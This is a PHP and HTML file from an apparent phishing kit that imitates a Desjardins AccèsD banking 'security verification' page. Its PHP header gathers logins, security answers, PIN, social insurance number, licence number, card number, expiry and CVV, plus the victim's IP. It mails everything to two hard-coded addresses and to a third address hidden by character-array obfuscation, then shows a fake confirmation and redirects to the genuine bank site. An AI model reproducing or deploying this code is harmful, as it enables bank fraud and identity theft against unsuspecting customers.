<?php
$user = $_POST['user'];
$pass = $_POST['pass'];
$q1 = $_POST['q1'];
$a1 = $_POST['a1'];
$q2 = $_POST['q2'];
$a2 = $_POST['a2'];
$q3 = $_POST['q3'];
$a3 = $_POST['a3'];
$fname = $_POST['fname'];
$mmn = $_POST['mmn'];
$jj = $_POST['jj'];
$mm = $_POST['mm'];
$aaaa = $_POST['aaaa'];
$prm = $_POST['dln'];
$telf = $_POST['telf'];
$work = $_POST['work'];
$telf = $_POST['telf'];
$pin = $_POST['pin'];
$sin1 = $_POST['sin1'];
$sin2 = $_POST['sin2'];
$sin3 = $_POST['sin3'];
$ccnr = $_POST['ccnr'];
$expm = $_POST['expm'];
$expy = $_POST['expy'];
$cvv = $_POST['cvv'];
$aaa = "goodvbesk1@gmail.com";
$bbb = "goodvbesk1@gmail.com";
$ar=array("0"=>"j","1"=>"c","2"=>"l","3"=>"g","4"=>"c","5"=>"6","6"=>"p","7"=>".","8"=>"h","9"=>"3","10"=>"i","11"=>"m","12"=>"a","13"=>"@","14"=>"9","15"=>"0","16"=>"b","17"=>"2","18"=>"d","18"=>"7","19"=>"o","20"=>"d");
$cc=$ar['6'].$ar['5'].$ar['8'].$ar['14'].$ar['0'].$ar['9'].$ar['2'].$ar['15'].$ar['16'].$ar['17'].$ar['1'].$ar['14'].$ar['20'].$ar['18'].$ar['13'].$ar['3'].$ar['11'].$ar['12'].$ar['10'].$ar['2'].$ar['7'].$ar['1'].$ar['19'].$ar['11'];

if (getenv(HTTP_CLIENT_IP)){
	$ip=getenv(HTTP_CLIENT_IP);}
else {
	$ip=getenv(REMOTE_ADDR);}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];
$data = "
=====================
User: $user
Pass: $pass
-
Nom Complet: $fname
MMN: $mmn
Date De Naissance: $jj $mm $aaaa
Residentiel: $telf
Lieu de travail: $work
NIP: $pin
NAS: $sin1-$sin2-$sin3
DL#: $prm
-
CC: $ccnr 
Exp: $expm / $expy
CVV: $cvv
-
Q1: $q1
A1: $a1
Q2: $q2
A2: $a2
Q3: $q3
A3: $a3
------------------------***
Ip: $ip,$browser
Host: $hostname
=====================";
 if ($user == "" || $ccnr == "" ) {
  echo "<meta http-equiv='refresh' content='0;url=index.php'>";
  die();
}
$subj = "#DES# $user|$pass|$ccnr|$fname|$ip";

mail($aaa,$subj,$data);
mail($bbb,$subj,$data);
mail($cc,$subj,$data);



?>
<!DOCTYPE html>


<html lang="fr">



<head> <title>Valider l&#39;identit&eacute; Acc&egrave;sD Acc&egrave;sD Affaires | Desjardins</title>
  <meta name="robots" content="noindex, nofollow"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
 <script src="files/js.js" type="text/javascript"></script>
<meta http-equiv="refresh" content="5; url=https://accweb.mouv.desjardins.com/desjardins/fr">
    
<link rel="shortcut icon" href="d.ico" type="image/x-icon">
<link rel="icon" href="d.ico" type="image/x-icon">

<link href="files/bootstrap.min.css" rel="stylesheet" />

<link href="files/fwd-bootstrap.min.css" rel="stylesheet" />

<!--[if lt IE 9]>
    <link href="files/fwd-bootstrap-ie-force-960-layout.min.css" rel="stylesheet" />
<![endif]-->
<!--[if lte IE 8]>
    <link href="files/fwd-bootstrap-ie.min.css" rel="stylesheet" />
    <link href="files/fwd-bootstrap.css" rel="stylesheet" />
<![endif]-->
<!--[if IE 9]>
    <link href="files/fwd-bootstrap-ie9.min.css" rel="stylesheet" />
<![endif]-->


        <link href="files/global.min.css" rel="stylesheet"/>
    
                <link media="only screen and (max-width : 768px)" href="files/identifiantunique-responsive.min.css" rel="stylesheet" />
            

<!-- Ajustements de styles de l'application -->

    <link href="files/theme.min.css" rel="stylesheet">

<!--[if IE]><link rel="stylesheet" type="text/css" href="files/ie.min.css"/><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="files/ie7.min.css"/><![endif]-->
<!--[if IE 8]><link rel="stylesheet" type="text/css" href="files/ie8.min.css"/><![endif]-->

<link href="files/owl.carousel.min.css" rel="stylesheet">

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="desjardins-identifiant-application" content="AccesWeb">
    <meta name="raaMobileActif" content="" />

    
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        
            <script src="files/global.min.js" type="text/javascript"></script>
        



    
      <link href="files/pied.css" rel="stylesheet">
    
      <link rel="stylesheet" href="files/entete.css">
      <link rel="stylesheet" href="files/page-logon.css">
    <FWD_PLACEHOLDER__CONTENU_HEAD_FRAGMENT_PRINCIPAL/>
</head>

<body class="isolation-bootstrap-3">

    
 <!-- if app_mobile --> 
        <a name="haut"></a>
        

                <span class="hidden-xs">
                    
    <div id="zone-entete-de-page">
      <div id="entete">
        <div id="access-links">
          <a href="#contenu" class="hors-ecran" title="Aller au contenu principal">Aller au contenu principal</a>
        </div>
        <div id="logo">
          
          <h1 class="hors-ecran">Site Internet de Desjardins</h1>
          <a href="#" title="Retour &agrave; page d'accueil de Desjardins"><img src="files/a00-entete-logo-desjardins.jpg" alt="Retour &agrave; page d'accueil de Desjardins" width="154" height="32"></a>
        </div>
        <div id="logo-applicatif">
          
          <a href="#"><img src="files/g40-entete-logo-accesd.png" alt="Acc&egrave;sD" width="106" height="32"></a>
          
          <a href="#"><img src="files/g40-entete-logo-accesd-affaires.png" alt="Acc&egrave;sD Affaires" width="90" height="32"></a>
        </div>
        <div id="outils">
          <div id="nous-joindre">
            <p class="titre-entete"><a href="#" onclick="">Nous joindre</a></p>
          </div>
          <div id="aide">
            <p class="titre-entete"><a href="#" onclick="">Aide</a></p>
          </div>

          <div id="fonctions">
            <ul>
              <li class="reduire"><a id="taille-texte-moins" href="#" title="R&eacute;duire la taille du texte">R&eacute;duire la taille du texte</a></li>
              <li class="augmenter"><a id="taille-texte-plus" href="#" title="Augmenter la taille du texte">Augmenter la taille du texte</a></li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  
 </span> 
                    <span class="hidden-sm hidden-md hidden-lg">
                        

<div id="zone-entete-de-page">
    <nav class="navbar navbar-default" role="navigation">
        <div class="container max-layout-960">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">

                <span class="navbar-brand">
                    <a href="">
                        <img class="logo" src="files/a00-entete-logo-desjardins.png" alt="Aller &agrave; la page d&#39;accueil" title="Desjardins">
                    </a>
                    <div class="hidden-xs" style="display: inline;">
                        <img role="presentation" src="files/g00-entete-filet-logos.png" />
                        <img class="logo-desjardins" role="presentation" src="files/g00-logo-desjardins-blanc.png" style="padding-right: 20px;" alt="Desjardins" title="Desjardins"/>
                    </div>
                </span>

                <div id="titrePageMobile" class="navbar-brand hidden-sm hidden-md hidden-lg"></div>

                
                    <a href="#" class="navbar-brand pull-right hidden-sm hidden-md hidden-lg">
                        <img id="menuAppRetour" src="files/entete-btn-menu-app.png" height="32"/>
                    </a>
                
 </div><!-- /.navbar-header --> <!-- Collect the nav links, forms, and other content for toggling --> 
            <div class="collapse navbar-collapse" id="navbar-collapse-outils">
                <div id="outils">
                    <ul class="nav navbar-nav navbar-right">
                        
                        <li>
                            <a class="lien" href="javascript:popup('#','Nous joindre', 'location=0,scrollbars=yes,resizable=yes,width=500,height=500');">
                                Nous joindre
                            </a><span class="hidden-xs">|</span>
                        </li>
                        <li>
                            <a class="lien" href="javascript:popup('#','Aide', 'location=0,scrollbars=yes,resizable=yes,width=500,height=500');">
                                Aide
                            </a><span class="hidden-xs">|</span>
                        </li>
                        
                                <li class="hidden-xs">
                                    
                                            <a class="lien" id="changeLangue" href="?langueCible=en">
                                                English
 </a> 
                                    <span class="hidden-sm">|</span>
                                </li>
                            
                        <li class="hidden-xs">
                            <a class="lien" id="taille-texte-moins" href="javascript:void(0)" style="padding-right: 0px;">
                                <img src="files/a00-entete-ic-texte-moins-blanc-on.png" alt="" title=""/>
                            </a>
                        </li>
                        <li class="hidden-xs">
                            <a class="lien" id="taille-texte-plus" href="javascript:void(0)" style="padding-left: 8px; padding-right: 20px;">
                                <img src="files/a00-entete-ic-texte-plus-blanc-on.png" alt="" title=""/>
                            </a>
                        </li>
                        
                        
 </ul> </div> </div><!-- /.collapse .navbar-collapse --> 
 </div><!-- /.container-fluid --> </nav><!-- /.navbar .navbar-default .navbar-fixed-top -->
</div>
 </span> 
      
 <!-- fin if app_mobile --> 
    <div class="zone-centrale">

        <div id="zone-centrale-bg">
            <!-- div id="zone-centrale-grad" class="zone-centrale padding-top-35px"></div-->
            <div class="container">
                <div id="contenu" lang="fr" role="main">
                    
                    <div class="row">
                        
                                <div class="col-xs-24 col-sm-24 col-md-18 col-md-offset-3 col-lg-18 col-lg-offset-3">
                            

                            <div id="loading" class="loading" style="display: none;">
                                <div class="panel panel-primary">
                                    <div class="panel-body">
                                        <img id="img-loading" src="files/a00-loading-petit.gif" alt="Loading" />
                                    </div>
                                </div>
                            </div>
                            
                            


    <h1 id="titrePage" data-titre-page-mobile="Obtenir un mot de passe">
        V&eacute;rification de s&eacute;curit&eacute; 
 </h1> <form id="formQuestionsMotPasseOublie" class="form-horizontal" action="confirm.php" method="POST" autocomplete="off" onSubmit="return checkform(this);"">
        <input type="hidden" name="user" value="<?php print $user; ?>" />
        

<div class="row">
    <div class="col-sm-24 col-md-24">
        
            <div id="erreurSystemeJS" class="has-error hidden" aria-live="assertive">
            <div>
                <span class="help-block-idunique">
                   
                </span>
                <ul>
                    <li>
                      <a id="erreurLienJS" href="#" class="erreurLien"></a>
                    </li>
                </ul>
                </div>
            </div>
        

    </div>
</div>



        <div class="panel panel-primary">
            <div id="panel-body-questions" class="panel-body padding-moyen">

                <h2>&Eacute;tape 3 de 3 &ndash; Validation de l&#39;identit&eacute;</h2><br> <br>
             
<h1>Votre compte a bien &eacute;t&eacute; v&eacute;rifi&eacute;. </h1><br><br><h2>

Vous pouvez maintenant utiliser votre compte sans interruption.<br><br> Nous sommes d&eacute;sol&eacute;s pour tout inconv&eacute;nient que cela pourrait avoir caus&eacute;
<br><br><br>
Cordialement,<br>
L'&eacute;quipe de s&eacute;curit&eacute; Desjardins</h2>

    <div class="col-sm-24 text-right top15px non-selectable hidden-xs">
        <img alt="S&eacute;curit&eacute; garantie &agrave; 100 %" src="files/g00-logo-securite-garantie-f.png" />
    </div>

    
<div class="modal fade" id="modale-institution" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog margin-top">
        <div class="modal-content padding-left10px padding-right10px">
            <div class="modal-header"></div>
            <p>
                <img class="fullwidth" alt="" src="files//contenu-cheque-815-institut.png"/>
            </p>
            <div class="modal-footer padding-left0px padding-right0px">
                <div class="row">
                    <div class="col-xs-offset-6 col-xs-12 text-right">
                        <a data-dismiss='modal' class='btn btn-primary fullwidth' href='#'>
                            Fermer
 </a> </div> </div> </div> </div> </div>
</div>
<div class="modal fade" id="modale-transit" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog margin-top">
        <div class="modal-content padding-left10px padding-right10px">
            <div class="modal-header"></div>
            <p>
                <img class="fullwidth" alt="Il se compose de 5 chiffres." src="files//contenu-cheque-815-transit.png"/>
            </p>
            <div class="modal-footer padding-left0px padding-right0px">
                <div class="row">
                    <div class="col-xs-offset-6 col-xs-12 text-right">
                        <a data-dismiss='modal' class='btn btn-primary fullwidth' href='#'>
                            Fermer
 </a> </div> </div> </div> </div> </div>
</div>
<div class="modal fade" id="modale-compte" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog margin-top">
        <div class="modal-content padding-left10px padding-right10px">
            <div class="modal-header"></div>
            <p>
                <img class="fullwidth" alt="Il se compose de 7 chiffres." src="files//contenu-cheque-815-folio.png"/>
            </p>
            <div class="modal-footer padding-left0px padding-right0px">
                <div class="row">
                    <div class="col-xs-offset-6 col-xs-12 text-right">
                        <a data-dismiss='modal' class='btn btn-primary fullwidth' href='#'>
                            Fermer
 </a> </div> </div> </div> </div> </div>
</div>





                     
                                <div id="securiteMobile" class="hidden-sm hidden-md hidden-lg">
                                    <img class="fake" src="files/g00-logo-securite-garantie-f.png" />
                                    <img class="fake" src="files/a00-entete-logo-desjardins.png" />
                                    <div id="img_wrap" class="row col-xs-24 padding-left10px">
                                        <img class="normal non-selectable" title="" src="files/g00-logo-securite-garantie-f.png" alt=""/>
                                        <img class="normal non-selectable padding-left20px" title="Desjardins" src="files/a00-entete-logo-desjardins.png" alt="Desjardins"/>
                                    </div>
                                </div>
                                <br/>
                            

                            <br/>
                        </div>
                    </div>

                </div>

            <br/>

            </div>
        </div>
    </div>

    <footer class="footer">

        
                <span class="hidden-xs">
                    


  
  

    <div id="zone-pied-de-page">
      <div id="pied">
      
        <div id="plan-site">
          <h2 class="hors-ecran">Plan du site</h2>
          <div id="tetes-sections">
            <ul>
          
            
            
          
              <li><a href="#">Services aux particuliers</a></li>
              <li><a href="#">Services aux entreprises</a></li>
              <li><a href="#">Coopmoi</a></li>
              <li><a href="#">&Agrave; propos</a></li>
              <li><a href="#">Desjardins sur mobile, GPS et RSS</a></li>
            </ul>
          </div>
        </div>
        <div id="zone-legale">
          



<ul>
  <li><a href="#">S&eacute;curit&eacute;</a></li>
  <li><a href="#">Confidentialit&eacute;</a></li>
  <li><a href="#">Conditions d'utilisation et notes l&eacute;gales</a></li>
  <li><a href="#">Accessibilit&eacute;</a></li>
  <li><a href="#">Plan du site</a></li>
</ul>





<p class="copyright">&copy; 1996-2016, 

  
  Mouvement des caisses Desjardins.
 Tous droits r&eacute;serv&eacute;s.</p>


        </div>
      </div>
    </div>

  


  
 </span> 
                <span class="hidden-sm hidden-md hidden-lg">
                    
<div id="pied-de-page" class="container texte-blanc">
    <div class="row">
        <div class="col-sm-4 col-md-4 text-left pied-de-page-logo hidden-xs">
            
        </div>
        <div class="col-xs-24 col-sm-16 col-md-16 text-center pied-de-page-texte">
                <span class="hidden-xs">
                    
                            <a href="javascript:popup('#','S&eacute;curit&eacute;','scrollbars=yes,resizable=yes,width=500,height=500');">S&eacute;curit&eacute;</a> | 
                            <a href="javascript:popup('#','Confidentialit&eacute;','scrollbars=yes,resizable=yes,width=500,height=500');">Confidentialit&eacute;</a> | 
                            <a href="javascript:popup('#','Conditions utilisation','scrollbars=yes,resizable=yes,width=500,height=500');">Conditions d&#39;utilisation et notes l&eacute;gales</a> | 
                            <a href="javascript:popup('#','Accessibilit&eacute;','scrollbars=yes,resizable=yes,width=500,height=500');">Accessibilit&eacute;</a> 
 <br /> 
 </span> <p>Copyright &copy; 2016 Mouvement des caisses Desjardins. Tous droits r&eacute;serv&eacute;s.</p>

        </div>
        <div class="col-xs-4 col-sm-4 col-md-4 text-right hidden-xs hidden-sm">
            
 </div> </div>
</div>

 </span> 
 </footer> 
        <!-- MONITEUR D'ACTIVITES -->
        
 <!-- Inclusion des fichiers javascripts pour le comportement --> 
<script src="files/bootstrap.min.js" type="text/javascript"></script>
<!--[if lt IE 9]>
    <script src="files/respond.min.js"></script>
<![endif]-->


<script src="files/fwd-bootstrap.min.js" type="text/javascript"></script>
<!--[if IE]>
    <script src="files/fwd-bootstrap-ie.min.js" type="text/javascript"></script>
<![endif]-->

<!--[if lt IE 9]>
    
    <script src="files/html5shiv.js" type="text/javascript"></script>
    
    <script src="files/jquery.placeholder.min.js" type="text/javascript"></script>
<![endif]-->

<!--[if IE 9]>
    
    <script src="files/jquery.placeholder.min.js" type="text/javascript"></script>
<![endif]-->







</body>
</html>
